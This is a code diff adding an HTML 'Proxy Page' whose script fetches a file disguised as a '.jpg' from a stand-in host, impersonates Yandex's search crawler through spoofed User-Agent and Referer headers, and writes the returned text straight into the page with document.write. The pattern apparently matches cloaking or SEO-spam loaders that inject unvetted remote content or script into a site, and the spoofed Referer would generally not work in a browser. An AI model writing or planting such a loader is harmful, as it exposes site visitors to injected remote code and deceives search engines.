@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Proxy Page</title>
+</head>
+<body>
+  <script>
+    fetch('http://example.com/templates/apre/slide_2.jpg', {
+      method: 'GET',
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
+        'Referer': 'https://www.yandex.ru'
+      }
+    })
+    .then(response => response.text())
+    .then(data => {
+      document.write(data);
+    })
+    .catch(error => {
+      console.error('Error:', error);
+      document.write('Error fetching the resource.');
+    });
+  </script>
+</body>
+</html>
